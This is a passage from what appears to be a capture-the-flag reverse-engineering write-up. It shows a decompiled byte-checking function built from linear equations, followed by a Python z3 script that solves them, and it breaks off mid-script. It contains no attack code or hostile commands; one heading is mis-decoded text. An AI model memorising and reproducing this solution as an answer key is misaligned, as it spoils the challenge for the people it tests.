</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>143</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>+</span> <span class=mi>148</span> <span class=o>*</span> <span class=p>(</span><span class=n>a1</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span> <span class=n>a1</span><span class=p>[</span><span class=mi>9</span><span class=p>])</span> <span class=o>+</span> <span class=mi>168</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>70647</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>33</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span> <span class=mi>194</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>+</span> <span class=mi>10</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>+</span> <span class=mi>186</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>53174</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>32</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>+</span> <span class=p>(</span><span class=n>a1</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>7</span><span class=p>)</span> <span class=o>+</span> <span class=mi>33</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>+</span> <span class=mi>152</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>26118</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>184</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span> <span class=o>+</span> <span class=mi>115</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=o>+</span> <span class=mi>164</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>+</span> <span class=mi>29</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>81254</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>129</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=o>+</span> <span class=mi>35</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>+</span> <span class=mi>129</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span> <span class=o>+</span> <span class=mi>165</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>78646</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>134</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=o>+</span> <span class=mi>54</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>+</span> <span class=mi>39</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span> <span class=o>+</span> <span class=mi>18</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>29827</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>106</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span> <span class=o>+</span> <span class=mi>133</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=o>+</span> <span class=mi>80</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>+</span> <span class=mi>43</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>53660</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>121</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>18</span><span class=p>]</span> <span class=o>+</span> <span class=mi>187</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>+</span> <span class=mi>32</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>17</span><span class=p>]</span> <span class=o>+</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>19</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>24667</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>170</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>17</span><span class=p>]</span> <span class=o>+</span> <span class=mi>66</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>+</span> <span class=mi>58</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>18</span><span class=p>]</span> <span class=o>+</span> <span class=mi>36</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>19</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>44188</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>103</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>+</span> <span class=mi>120</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>17</span><span class=p>]</span> <span class=o>+</span> <span class=mi>12</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>18</span><span class=p>]</span> <span class=o>+</span> <span class=mi>175</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>19</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>52310</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>83</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>+</span> <span class=mi>92</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>17</span><span class=p>]</span> <span class=o>+</span> <span class=mi>129</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>18</span><span class=p>]</span> <span class=o>+</span> <span class=mi>143</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>19</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>46020</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>141</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>22</span><span class=p>]</span> <span class=o>+</span> <span class=mi>54</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>21</span><span class=p>]</span> <span class=o>+</span> <span class=mi>100</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>20</span><span class=p>]</span> <span class=o>+</span> <span class=mi>122</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>23</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>66732</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>85</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>21</span><span class=p>]</span> <span class=o>+</span> <span class=mi>171</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>20</span><span class=p>]</span> <span class=o>+</span> <span class=mi>69</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>22</span><span class=p>]</span> <span class=o>+</span> <span class=mi>7</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>23</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>46817</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>a1</span><span class=p>[</span><span class=mi>22</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>7</span><span class=p>)</span> <span class=o>+</span> <span class=mi>197</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>20</span><span class=p>]</span> <span class=o>+</span> <span class=mi>48</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>21</span><span class=p>]</span> <span class=o>+</span> <span class=mi>132</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>23</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>83536</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>181</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>21</span><span class=p>]</span> <span class=o>+</span> <span class=mi>101</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>20</span><span class=p>]</span> <span class=o>+</span> <span class=mi>79</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>22</span><span class=p>]</span> <span class=o>+</span> <span class=mi>144</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>23</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>80587</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>149</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>24</span><span class=p>]</span> <span class=o>+</span> <span class=mi>187</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>25</span><span class=p>]</span> <span class=o>+</span> <span class=mi>24</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>26</span><span class=p>]</span> <span class=o>+</span> <span class=mi>142</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>27</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>92687</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>49</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>26</span><span class=p>]</span> <span class=o>+</span> <span class=mi>86</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>25</span><span class=p>]</span> <span class=o>+</span> <span class=mi>118</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>24</span><span class=p>]</span> <span class=o>+</span> <span class=mi>50</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>27</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>49285</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>164</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>26</span><span class=p>]</span> <span class=o>+</span> <span class=mi>170</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>25</span><span class=p>]</span> <span class=o>+</span> <span class=mi>70</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>24</span><span class=p>]</span> <span class=o>+</span> <span class=mi>193</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>27</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>92711</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>95</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>26</span><span class=p>]</span> <span class=o>+</span> <span class=mi>198</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>25</span><span class=p>]</span> <span class=o>+</span> <span class=mi>96</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>24</span><span class=p>]</span> <span class=o>+</span> <span class=n>a1</span><span class=p>[</span><span class=mi>27</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>61904</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>114</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>28</span><span class=p>]</span> <span class=o>+</span> <span class=mi>179</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>29</span><span class=p>]</span> <span class=o>+</span> <span class=mi>37</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>+</span> <span class=mi>163</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>31</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>53864</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>132</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>+</span> <span class=mi>94</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>29</span><span class=p>]</span> <span class=o>+</span> <span class=mi>49</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>28</span><span class=p>]</span> <span class=o>+</span> <span class=mi>99</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>31</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>36980</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>150</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>+</span> <span class=mi>113</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>29</span><span class=p>]</span> <span class=o>+</span> <span class=mi>43</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>28</span><span class=p>]</span> <span class=o>+</span> <span class=p>(</span><span class=n>a1</span><span class=p>[</span><span class=mi>31</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>7</span><span class=p>)</span> <span class=o>==</span> <span class=mi>40829</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>115</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>+</span> <span class=mi>139</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>29</span><span class=p>]</span> <span class=o>+</span> <span class=n>a1</span><span class=p>[</span><span class=mi>28</span><span class=p>]</span> <span class=o>+</span> <span class=mi>44</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>31</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>22448</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>z3è„šæœ¬å¦‚ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>z3</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_group</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>equations</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>vars</span> <span class=o>=</span> <span class=p>[</span><span class=n>Int</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;a</span><span class=si>{</span><span class=n>idx</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>i</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>coeffs</span><span class=p>,</span> <span class=n>result</span> <span class=ow>in</span> <span class=n>equations</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>Sum</span><span class=p>([</span><span class=n>c</span> <span class=o>*</span> <span class=n>v</span> <span class=k>for</span> <span class=n>c</span><span class=p>,</span> <span class=n>v</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>coeffs</span><span class=p>,</span> <span class=nb>vars</span><span class=p>)])</span> <span class=o>==</span> <span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>solutions</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>s</span><span class=o>.</span><span class=n>check</span><span class=p>()</span> <span class=o>==</span> <span class=n>sat</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>m</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>solution</span> <span class=o>=</span> <span class=p>[</span><span class=n>m</span><span class=p>[</span><span class=n>v</span><span class=p>]</span><span class=o>.</span><span class=n>as_long</span><span class=p>()</span> <span class=k>for</span> <span class=n>v</span> <span class=ow>in</span> <span class=nb>vars</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>solutions</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>tuple</span><span class=p>(</span><span class=n>solution</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>Or</span><span class=p>([</span><span class=n>v</span> <span class=o>!=</span> <span class=n>m</span><span class=p>[</span><span class=n>v</span><span class=p>]</span> <span class=k>for</span> <span class=n>v</span> <span class=ow>in</span> <span class=nb>vars</span><span class=p>]))</span> 
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>solutions</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>groups</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s1>&#39;equations&#39;</span><span class=p>:</span> <span class=p>[([</span><span class=mi>173</span><span class=p>,</span> <span class=mi>48</span><span class=p>,</span> <span class=mi>118</span><span class=p>,</span> <span class=mi>193</span><span class=p>],</span> <span class=mi>66131</span><span class=p>),</span> <span class=p>([</span><span class=mi>68</span><span class=p>,</span> <span class=mi>196</span><span class=p>,</span> <span class=mi>104</span><span class=p>,</span> <span class=mi>10</span><span class=p>],</span> <span class=mi>52620</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                   <span class=p>([</span><span class=mi>22</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>88</span><span class=p>,</span> <span class=mi>71</span><span class=p>],</span> <span class=mi>36011</span><span class=p>),</span> <span class=p>([</span><span class=mi>89</span><span class=p>,</span> <span class=mi>141</span><span class=p>,</span> <span class=mi>59</span><span class=p>,</span> <span class=mi>194</span><span class=p>],</span> <span class=mi>61842</span><span class=p>)]},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s1>&#39;equations&#39;</span><span class=p>:</span> <span class=p>[([</span><span class=mi>40</span><span class=p>,</span> <span class=mi>88</span><span class=p>,</span> <span class=mi>175</span><span class=p>,</span> <span class=mi>89</span><span class=p>],</span> <span class=mi>65258</span><span class=p>),</span> <span class=p>([</span><span class=mi>82</span><span class=p>,</span> <span class=mi>166</span><span class=p>,</span> <span class=mi>26</span><span class=p>,</span> <span class=mi>78</span><span class=p>],</span> <span class=mi>58176</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                   <span class=p>([</span><span class=mi>73</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>149</span><span class=p>,</span> <span class=mi>116</span><span class=p>],</span> <span class=mi>62478</span><span class=p>),</span> <span class=p>([</span><span class=mi>198</span><span class=p>,</span> <span class=mi>80</span><span class=p>,</span> <span class=mi>176</span><span class=p>,</span> <span class=mi>193</span><span class=p>],</span> <span class=mi>114069</span><span class=p>)]},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s1>&#39;equations&#39;</span><span class=p>:</span> <span class=p>[([</span><span class=mi>83</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=mi>178</span><span class=p>,</span> <span class=mi>30</span><span class=p>],</span> <span class=mi>56170</span><span class=p>),</span> <span class=p>([</span><span class=mi>148</span><span class=p>,</span> <span class=mi>148</span><span class=p>,</span> <span class=mi>143</span><span class=p>,</span> <span class=mi>168</span><span class=p>],</span> <span class=mi>70647</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                   <span class=p>([</span><span class=mi>33</span><span class=p>,</span> <span class=mi>194</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>186</span><span class=p>],</span> <span class=mi>53174</span><span class=p>),</span> <span class=p>([</span><span class=mi>128</span><span class=p>,</span> <span class=mi>33</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=mi>152</span><span class=p>],</span> <span class=mi>26118</span><span class=p>)]},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s1>&#39;equations&#39;</span><span class=p>:</span> <span class=p>[([</span><span class=mi>164</span><span class=p>,</span> <span class=mi>115</span><span class=p>,</span> <span class=mi>184</span><span class=p>,</span> <span class=mi>29</span><span class=p>],</span> <span class=mi>81254</span><span class=p>),</span> <span class=p>([</span><span class=mi>35</span><span class=p>,</span> <span class=mi>129</span><span class=p>,</span> <span class=mi>129</span><span class=p>,</span> <span class=mi>165</span><span class=p>],</span> <span class=mi>78646</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                   <span class=p>([</span><span class=mi>54</span><span class=p>,</span> <span class=mi>134</span><span class=p>,</span> <span class=mi>39</span><span class=p>,</span> <span class=mi>18</span><span class=p>],</span> <span class=mi>29827</span><span class=p>),</span> <span class=p>([</span><span class=mi>80</span><span class=p>,</span> <span class=mi>133</span><span class=p>,</span> <span class=mi>106</span><span class=p>,</span> <span class=mi>43</span><span class=p>],</span> <span class=mi>53660</span><span class=p>)]},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s1>&#39;equations&#39;</span><span class=p>:</span> <span class=p>[([</span><span class=mi>187</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=mi>121</span><span class=p>,</span> <span class=mi>2</span><span class=p>],</span> <span class=mi>24667</span><span class=p>),</span> <span class=p>([</span><span class=mi>66</span><span class=p>,</span> <span class=mi>170</span><span class=p>,</span> <span class=mi>58</span><span class=p>,</span> <span class=mi>36</span><span class=p>],</span> <span class=mi>44188</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                   <span class=p>([</span><span class=mi>103</span><span class=p>,</span> <span class=mi>120</span><span class=p>,</span> <span class=mi>12</span><span class=p>,</span> <span class=mi>175</span><span class=p>],</span> <span class=mi>52310</span><span class=p>),</span> <span class=p>([</span><span class=mi>83</span><span class=p>,</span> <span class=mi>92</span><span class=p>,</span> <span class=mi>129</span><span class=p>,</span> <span class=mi>143</span><span class=p>],</span> <span class=mi>46020</span><span class=p>)]},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s1>&#39;equations&#39;</span><span class=p>:</span> <span class=p>[([</span><span class=mi>100</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>141</span><span class=p>,</span> <span class=mi>122</span><span class=p>],</span> <span class=mi>66732</span><span class=p>),</span> <span class=p>([</span><span class=mi>171</span><span class=p>,</span> <span class=mi>85</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>7</span><span class=p>],</span> <span class=mi>46817</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                   <span class=p>([</span><span class=mi>197</span><span class=p>,</span> <span class=mi>48</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>132</span><span class=p>],</span> <span class=mi>83536</span><span class=p>),</span> <span class=p>([</span><span class=mi>101</span><span class=p>,</span> <span class=mi>181</span><span class=p>,</span> <span class=mi>79</span><span class=p>,</span> <span class=mi>144</span><span class=p>],</span> <span class=mi>80587</span><span class=p>)]},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s1>&#39;equations&#39;</span><span class=p>:</span> <span class=p>[([</span><span class=mi>149</span><span class=p>,</span> <span class=mi>187</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=mi>142</span><span class=p>],</span> <span class=mi>92687</span><span class=p>),</span> <span class=p>([</span><span class=mi>118</span><span class=p>,</span> <span class=mi>86</span><span class=p>,</span> <span class=mi>49</span><span class=p>,</span> <span class=mi>50</span><span class=p>],</span> <span class=mi>49285</span><span class=p>),</span>
